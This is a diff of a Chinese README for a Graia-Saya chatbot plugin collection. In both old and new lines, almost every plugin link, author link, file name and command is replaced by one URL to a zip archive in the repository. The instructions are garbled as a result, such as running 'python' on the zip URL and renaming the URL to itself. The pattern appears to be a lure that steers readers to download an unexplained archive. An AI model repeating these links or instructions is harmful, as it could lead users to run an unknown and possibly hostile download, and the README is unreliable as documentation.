@@ -1,6 +1,6 @@
 # 一个Graia-Saya的插件仓库
 
-这是一个存储基于 [Graia-Saya](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip) 的插件的仓库
+这是一个存储基于 [Graia-Saya](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip) 的插件的仓库
 
 如果您有这类项目，欢迎提交 Pull request 将您的项目添加到这里(注意，本仓库仅接受开源项目的仓库地址)
 
@@ -14,43 +14,43 @@
 
 若您想单独使用，可以将其下载并放入自己的module文件夹中
 
-若您想开箱即用，您可以直接clone整个仓库并使用 `python https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 命令执行本仓库自带的启动程序
+若您想开箱即用，您可以直接clone整个仓库并使用 `python https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 命令执行本仓库自带的启动程序
 
-注意，若使用本仓库自带启动程序，您需要先将 `https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 文件改名为 `https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 并填入其中的必要信息
+注意，若使用本仓库自带启动程序，您需要先将 `https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 文件改名为 `https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 并填入其中的必要信息
 
 ## 插件列表
 插件名|作者|功能描述|注意事项
 :--:|:--:|:--|:--
-[MessagePrinter](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个示例插件，输出所有收到的消息|
-[WeiboHotSearch](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取当前微博热搜50条|本插件依赖于本仓库下 `https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 中的 `messagechain_to_img` 函数
-[ZhihuHotSearch](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取当前知乎热搜50条|本插件依赖于本仓库下 `https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 中的 `messagechain_to_img` 函数
-[GithubHotSearch](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取当前github热搜25条|本插件依赖于本仓库下 `https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 中的 `messagechain_to_img` 函数
-[Repeater](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个复读插件|
-[PetPet](modules/PetPet)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|生成摸头gif|
-[PixivImageSearcher](modules/PixivImageSearcher)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个链接saucenao的以图搜图插件|请自行配置 saucenao cookie
-[PdfSearcher](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以搜索pdf的插件|
-[NetworkCompiler](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|网络编译器（菜鸟教程）|
-[Text2QrcodeGenerator](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以将文字转为二维码的插件|
-[GroupWordCloudGenerator](modules/GroupWordCloudGenerator)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以记录聊天记录并生成个人/群组词云的插件|
-[BilibiliBangumiSchedule](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以获取一周内B站新番时间表的插件|
-[KeywordReply](modules/KeywordReply)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个支持自定义回复的插件|
-[SteamGameSearcher](modules/SteamGameSearcher)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以搜索steam游戏的插件|
-[BangumiInfoSearcher](modules/BangumiInfoSearcher)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以搜索番剧信息的插件|
-[PornhubStyleLogoGenerator](modules/PornhubStyleLogoGenerator)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以生成 pornhub style logo 的插件|
-[AbbreviatedPrediction](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以获取字母缩写内容的插件|
-[LeetcodeInfoCrawer](modules/LeetcodeInfoCrawer)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以获取leetcode信息的插件|
-[ImageSender](modules/ImageSender)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个图片~~(setu)~~发送插件|
-[HeadSplicer](modules/HeadSplicer)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个接头霸王插件|
-[WyySongOrderer](modules/WyySongOrderer)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个(全损音质x)网易云源的点歌插件|
-[5000Zhao](modules/5000zhao)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个 5000兆円欲しい! style的图片生成器|
-[KeywordDetection](modules/KeywordDetection)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个敏感词过滤插件（自带数据库）|
-[PhantomTank](modules/PhantomTank)|[SAGIRI-kawaii](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个幻影坦克生成器|
-[NiBuNengXXMa](modules/NiBuNengXXMa)| [eeehhheee](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip) |生成如示例样式的图片|安装Pillow
-[BiliResolve](modules/BiliResolve)|[EnkanSakura](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|B站视频分享解析|
-[ChatBot](modules/ChatBot)|[Roc136](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|聊天机器人|需要自行配置所用的机器人及所需的key
-[GarbageClassification](modules/GarbageClassification)|[Roc136](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取垃圾分类信息|
-[KissKiss](modules/KissKiss)|[SuperWaterGod](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|生成头像互亲的gif|
-[Weather](modules/Weather)|[Roc136](https://raw.githubusercontent.com/Meorny/saya_plugins_collection/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|天气预报|需要自行配置`KEY`
+[MessagePrinter](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个示例插件，输出所有收到的消息|
+[WeiboHotSearch](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取当前微博热搜50条|本插件依赖于本仓库下 `https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 中的 `messagechain_to_img` 函数
+[ZhihuHotSearch](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取当前知乎热搜50条|本插件依赖于本仓库下 `https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 中的 `messagechain_to_img` 函数
+[GithubHotSearch](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取当前github热搜25条|本插件依赖于本仓库下 `https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip` 中的 `messagechain_to_img` 函数
+[Repeater](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个复读插件|
+[PetPet](modules/PetPet)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|生成摸头gif|
+[PixivImageSearcher](modules/PixivImageSearcher)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个链接saucenao的以图搜图插件|请自行配置 saucenao cookie
+[PdfSearcher](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以搜索pdf的插件|
+[NetworkCompiler](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|网络编译器（菜鸟教程）|
+[Text2QrcodeGenerator](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以将文字转为二维码的插件|
+[GroupWordCloudGenerator](modules/GroupWordCloudGenerator)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以记录聊天记录并生成个人/群组词云的插件|
+[BilibiliBangumiSchedule](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以获取一周内B站新番时间表的插件|
+[KeywordReply](modules/KeywordReply)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个支持自定义回复的插件|
+[SteamGameSearcher](modules/SteamGameSearcher)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以搜索steam游戏的插件|
+[BangumiInfoSearcher](modules/BangumiInfoSearcher)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以搜索番剧信息的插件|
+[PornhubStyleLogoGenerator](modules/PornhubStyleLogoGenerator)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以生成 pornhub style logo 的插件|
+[AbbreviatedPrediction](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以获取字母缩写内容的插件|
+[LeetcodeInfoCrawer](modules/LeetcodeInfoCrawer)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个可以获取leetcode信息的插件|
+[ImageSender](modules/ImageSender)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个图片~~(setu)~~发送插件|
+[HeadSplicer](modules/HeadSplicer)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个接头霸王插件|
+[WyySongOrderer](modules/WyySongOrderer)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个(全损音质x)网易云源的点歌插件|
+[5000Zhao](modules/5000zhao)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个 5000兆円欲しい! style的图片生成器|
+[KeywordDetection](modules/KeywordDetection)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个敏感词过滤插件（自带数据库）|
+[PhantomTank](modules/PhantomTank)|[SAGIRI-kawaii](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|一个幻影坦克生成器|
+[NiBuNengXXMa](modules/NiBuNengXXMa)| [eeehhheee](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip) |生成如示例样式的图片|安装Pillow
+[BiliResolve](modules/BiliResolve)|[EnkanSakura](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|B站视频分享解析|
+[ChatBot](modules/ChatBot)|[Roc136](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|聊天机器人|需要自行配置所用的机器人及所需的key
+[GarbageClassification](modules/GarbageClassification)|[Roc136](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|获取垃圾分类信息|
+[KissKiss](modules/KissKiss)|[SuperWaterGod](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|生成头像互亲的gif|
+[Weather](modules/Weather)|[Roc136](https://github.com/Meorny/saya_plugins_collection/raw/refs/heads/master/modules/NiBuNengXXMa/saya-plugins-collection-3.4.zip)|天气预报|需要自行配置`KEY`
 
 ## 其他
 
